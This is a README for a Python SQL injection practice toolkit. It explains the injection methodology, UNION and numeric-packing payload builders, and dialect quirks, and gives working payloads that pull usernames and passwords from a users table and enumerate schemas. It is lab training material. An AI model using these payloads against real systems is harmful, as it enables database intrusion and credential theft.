# sqli_toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)

Interactive walkthrough + payload builders + static cheatsheets for SQL
injection practice.

## Contents

| File               | Purpose                                                 |
|--------------------|---------------------------------------------------------|
| `helper.py`        | Interactive walkthrough (main entry point)              |
| `cheatsheet.py`    | Static reference tables (fingerprint, concat, WAF, ...) |
| `union_builder.py` | UNION SELECT payload builder with concatenation         |
| `pack_builder.py`  | Packs ASCII characters into INT / BIGINT                |
| `examples.py`      | Static payload samples                                  |
| `tests/`           | pytest suite for the builders                           |

## Requirements

- Python 3.8+
- `pytest` for running the test suite (optional)

## Run

    cd ..
    python -m sqli_toolkit.helper        # interactive walkthrough
    python -m sqli_toolkit.cheatsheet    # full static cheatsheet
    python -m sqli_toolkit.examples      # static payload samples
    bash sqli_toolkit/run.sh helper

`run.sh` detects the package name from its own path, so it works even if
the directory was renamed.

## What `helper.py` does

The walkthrough follows the classic methodology, in this order:

1. Confirm the injection and determine the context
   (string / numeric / LIKE).
2. Count the columns in the original SELECT
   (`ORDER BY N` / `UNION SELECT NULL,...`).
3. Determine the column types (`'a'` vs `NULL`, per column).
4. Fingerprint the DBMS (version query / error message / concat behaviour).
5. Extract data using one of three strategies:
   - `UNION SELECT` into a string column,
   - numeric packing into INT / BIGINT,
   - blind (boolean or time-based).

At every extraction step, the helper offers a menu to:

- retry the same table with different columns,
- try another table,
- go back to STEP 4 (DBMS), STEP 3 (types), or STEP 2 (columns),
- exit,
- show the full cheatsheet.

The cheatsheet is printed only on request, not automatically at the end.

### Context detection

STEP 1 distinguishes three contexts:

- **string** — input is embedded inside single quotes:
  `WHERE name = '<input>'`
  - break test: `'` gives an error, `'-- -` fixes it
- **numeric** — input is used as a number: `WHERE id = <input>`
  - break test: `1'` gives an error, `1 AND 1=1` works
- **LIKE** — input is inside a LIKE pattern: `WHERE name LIKE '%<input>%'`
  - break test: `%'` is needed to close the pattern

The context decides the prefix (`'` or `1` or `%'`) of every later payload.

### Backtracking

`step_string` returns a string that tells `run()` where to jump next:

| Return value | Meaning                                  |
|--------------|------------------------------------------|
| `None`       | normal end (show final cheatsheet)       |
| `"columns"`  | retry the same table with new columns    |
| `"table"`    | try another table                        |
| `"col_count"`| go back to STEP 2 (column count)         |
| `"col_type"` | go back to STEP 3 (column types)         |
| `"dbms"`     | go back to STEP 4 (fingerprint DBMS)     |
| `"exit"`     | exit the walkthrough                     |

### Column list

When asked for column names, enter them comma-separated:

    username
    username,password
    username,password,created_at
    id,username,password,email,created_at

Any number of columns is accepted. All values are concatenated with
the separator (`:-:` by default) into the output column.

### LIMIT 1 OFFSET N

After the payload is built, the helper also prints two ready-made
variants with `LIMIT 1 OFFSET 0` and `LIMIT 1 OFFSET 1`. Use these to
read rows one by one when the page shows only the first result.

## Building a UNION payload

    from sqli_toolkit.union_builder import UnionBuilder

    sql = UnionBuilder(
        cols_total=3,
        string_cols=[1],
        layout={1: ["username", "password"]},
        dialect="mysql",
        sep=":-:",
        table="users",
    ).build()
    print(sql)

Output:

    ' UNION SELECT CONCAT(username,':-:',password),NULL,NULL FROM users-- -

## Advanced options (UnionBuilder)

### `force_func`

By default each dialect picks its natural concatenation form:

- MySQL / PostgreSQL / MSSQL use `CONCAT(...)`.
- Oracle / SQLite use the `||` operator.

`force_func=True` prefers `CONCAT(...)`.
`force_func=False` prefers the `||` operator.

The builder treats these as preferences, not absolute rules. If the
requested form is invalid for the dialect, a `UserWarning` is emitted
and the dialect-appropriate form is used instead.

Example:

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="mysql", force_func=False).build()
    # warns about PIPES_AS_CONCAT and returns (a || ':-:' || b)

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="oracle", sep=":-:",
                 force_func=True).build()
    # warns that Oracle CONCAT() takes at most 2 arguments
    # returns (a || ':-:' || b)

Use `quiet=True` to suppress the warning when you know what you are doing:

    UnionBuilder(2, [1], {1: ["a", "b"]},
                 dialect="oracle", sep=":-:",
                 force_func=True, quiet=True).build()

### `null_safe`

When a part can be NULL (for example, an optional `email` column),
the whole `CONCAT` result becomes NULL on most engines. `null_safe=True`
wraps each part in `null_fn(x, '')`, so NULLs become empty strings.

    UnionBuilder(3, [1], {1: ["username", "email"]},
                 dialect="mysql", null_safe=True, null_fn="IFNULL").build()

    UnionBuilder(3, [1], {1: ["username", "email"]},
                 dialect="postgres", null_safe=True).build()

`null_fn` defaults to `COALESCE` (works in PostgreSQL, MSSQL, Oracle,
SQLite). Use `IFNULL` for MySQL.

## Dialect notes: MSSQL

MSSQL has a few quirks that affect how payloads must be written.

### `+` vs `CONCAT()`

The `+` operator concatenates strings, but requires both operands to
be strings. Mixing a number and a string raises a type error:

    SELECT 'user' + 42                     -- error
    SELECT 'user' + CAST(42 AS NVARCHAR)   -- ok

`CONCAT()` accepts mixed types (available from SQL Server 2012):

    SELECT CONCAT('user', 42)              -- 'user42'

`CONCAT()` also treats NULL as an empty string. With `+`, a NULL operand
makes the whole expression NULL:

    SELECT CONCAT('a', NULL, 'b')          -- 'ab'
    SELECT 'a' + NULL + 'b'                -- NULL

### `CONCAT_WS`

Since SQL Server 2017, `CONCAT_WS(separator, a, b, ...)` joins values
with a separator, skipping NULLs:

    SELECT CONCAT_WS(':-:', 'user', NULL, 'pwd')   -- 'user:-:pwd'

### Practical recommendation

For UNION-based extraction, prefer `CONCAT()`:

    ' UNION SELECT CONCAT(username, ':-:', password), NULL FROM users-- -

If `CONCAT()` is unavailable (SQL Server < 2012), use `+` with explicit
`CAST` on any numeric column:

    ' UNION SELECT username + ':-:' + CAST(id AS NVARCHAR), NULL FROM users-- -

### `information_schema`

MSSQL supports `information_schema` the same way as MySQL and PostgreSQL,
but `TOP 1` is used instead of `LIMIT 1`:

    SELECT TOP 1 table_name FROM information_schema.tables

Alternative system catalogs:

    SELECT name FROM sys.tables
    SELECT name FROM sys.objects WHERE type='U'
    SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')

## Packing ASCII into numbers

Packing groups several characters into one integer, useful when the
only injectable column is numeric.

    from sqli_toolkit.pack_builder import NumType, sql_pack_expr

    t = NumType("int")
    src = "(SELECT table_name FROM information_schema.tables LIMIT 1)"
    print(sql_pack_expr(src, 1, t.max_chars_7bit, bits=7, dialect="mysql"))

Unpacking on the local side:

    from sqli_toolkit.pack_builder import (
        pack_ascii_7bit, pack_ascii_8bit,
        unpack_ascii_7bit, unpack_ascii_8bit,
    )

    n = pack_ascii_7bit("user")
    print(n)                        # 247263986
    print(unpack_ascii_7bit(n, 4))  # user

    n = pack_ascii_8bit("user")
    print(n)                        # 1970496882
    print(unpack_ascii_8bit(n, 4))  # user

### Overflow validation

Both `pack_ascii_7bit` and `pack_ascii_8bit` accept an optional
`num_type`. When provided, the function raises `ValueError` if the
packed value would exceed `num_type.max_value`:

    from sqli_toolkit.pack_builder import NumType, pack_ascii_8bit

    t = NumType("int")
    pack_ascii_8bit("~~~~", num_type=t)    # ok, 2122219134 <= 2147483647
    pack_ascii_8bit("~~~~~", num_type=t)   # ValueError: exceeds int max_value

`sql_pack_expr` performs a similar check on the number of characters
versus the bit budget:

    t = NumType("int")
    sql_pack_expr("(SELECT 1)", 1, 5, bits=8, num_type=t)
    # ValueError: cannot pack 5 chars into int at 8 bits/char (max 4)

### Why prefer 7-bit packing for signed integers

| Type  | Bytes | 8-bit chars       | 7-bit chars |
|-------|-------|-------------------|-------------|
| byte  | 1     | 1                 | 1           |
| short | 2     | 2                 | 2           |
| int   | 4     | 4 (overflow risk) | 4 (safe)    |
| long  | 8     | 8                 | 9           |

`INT` is signed, so 4 characters at 8 bits can overflow into the sign
bit. 7-bit packing leaves one bit of headroom and never overflows for
printable ASCII.

## Running the tests

    cd ..
    python -m pytest sqli_toolkit/tests -v

Tests cover:

- Packing and unpacking round-trips for 7-bit and 8-bit.
- Overflow validation for `pack_ascii_7bit`, `pack_ascii_8bit`, and
  `sql_pack_expr`.
- Numeric type limits.
- UnionBuilder output for MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
- `force_func` overrides with warnings.
- `null_safe` wrapping.
- Oracle 2-argument CONCAT fallback.
- Comment tokens.

## Disclaimer

For legal training only: PortSwigger Web Security Academy, your own labs,
or systems you have written permission to test.